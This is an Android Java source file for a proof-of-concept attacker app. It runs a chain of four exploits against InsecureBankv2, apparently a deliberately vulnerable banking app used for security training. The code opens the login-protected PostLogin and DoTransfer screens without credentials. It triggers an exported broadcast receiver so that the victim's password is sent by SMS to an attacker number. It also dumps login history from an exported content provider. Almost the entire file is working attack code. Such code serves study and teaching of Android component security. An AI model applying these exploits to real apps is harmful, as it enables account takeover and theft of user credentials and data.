package com.research.attacker;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

/**
 * Proof-of-concept: exploits exported components in InsecureBankv2.
 * Demonstrates what a malicious app can do without any permissions
 * beyond what's declared in its own manifest.
 *
 * Target: com.android.insecurebankv2
 * Vulnerabilities exploited:
 *   1. Exported activity (PostLogin) — no auth required
 *   2. Exported activity (DoTransfer) — no auth required
 *   3. Exported BroadcastReceiver (MyBroadCastReceiver) — SMS exfil
 *   4. Exported ContentProvider (TrackUserContentProvider) — login history
 */
public class AttackActivity extends AppCompatActivity {

    private static final String TARGET = "com.android.insecurebankv2";
    private static final String ATTACKER_PHONE = "15555215554";

    private TextView output;
    private StringBuilder log = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack);

        output = findViewById(R.id.output);
        Button btn = findViewById(R.id.btn_run);
        btn.setOnClickListener(v -> runExploits());
    }

    private void runExploits() {
        log.setLength(0);
        append("[*] Starting exploit chain against " + TARGET);
        append("");

        new Thread(() -> {
            exploit1_postlogin_bypass();
            sleep(1000);
            exploit2_dotransfer_bypass();
            sleep(1000);
            exploit3_broadcast_sms_exfil();
            sleep(1000);
            exploit4_contentprovider_dump();

            runOnUiThread(() -> append("\n[✓] All exploits fired."));
        }).start();
    }

    private void exploit1_postlogin_bypass() {
        runOnUiThread(() -> append("[1] Launching PostLogin without credentials..."));
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET, TARGET + ".PostLogin");
            intent.putExtra("uname", "attacker");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            runOnUiThread(() -> append("    [✓] PostLogin opened — full banking dashboard accessible"));
        } catch (Exception e) {
            runOnUiThread(() -> append("    [!] Failed: " + e.getMessage()));
        }
    }

    private void exploit2_dotransfer_bypass() {
        runOnUiThread(() -> append("[2] Launching DoTransfer without credentials..."));
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET, TARGET + ".DoTransfer");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            runOnUiThread(() -> append("    [✓] DoTransfer opened — money transfer screen accessible"));
        } catch (Exception e) {
            runOnUiThread(() -> append("    [!] Failed: " + e.getMessage()));
        }
    }

    private void exploit3_broadcast_sms_exfil() {
        runOnUiThread(() -> append("[3] Sending theBroadcast — SMS password exfiltration..."));
        try {
            Intent intent = new Intent("theBroadcast");
            intent.setClassName(TARGET, TARGET + ".MyBroadCastReceiver");
            intent.putExtra("phonenumber", ATTACKER_PHONE);
            intent.putExtra("newpass", "hacked_by_attacker");
            sendBroadcast(intent);
            runOnUiThread(() -> append("    [✓] Broadcast sent to MyBroadCastReceiver"));
            runOnUiThread(() -> append("    [✓] If victim has logged in: password SMS'd to " + ATTACKER_PHONE));
        } catch (Exception e) {
            runOnUiThread(() -> append("    [!] Failed: " + e.getMessage()));
        }
    }

    private void exploit4_contentprovider_dump() {
        runOnUiThread(() -> append("[4] Querying TrackUserContentProvider (login history)..."));
        try {
            Uri uri = Uri.parse("content://" + TARGET + ".TrackUserContentProvider/trackerusers");
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(uri, null, null, null, null);

            if (cursor == null) {
                runOnUiThread(() -> append("    [!] Cursor null — provider returned nothing"));
                return;
            }

            int count = cursor.getCount();
            runOnUiThread(() -> append("    [✓] ContentProvider queried — " + count + " login record(s) found"));

            StringBuilder rows = new StringBuilder();
            while (cursor.moveToNext()) {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    rows.append("      ").append(cursor.getColumnName(i))
                        .append(": ").append(cursor.getString(i)).append("\n");
                }
            }
            cursor.close();

            String result = rows.length() > 0 ? rows.toString() : "      (no records — victim hasn't logged in yet)";
            runOnUiThread(() -> append(result));
        } catch (Exception e) {
            runOnUiThread(() -> append("    [!] Failed: " + e.getMessage()));
        }
    }

    private void append(String msg) {
        log.append(msg).append("\n");
        output.setText(log.toString());
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
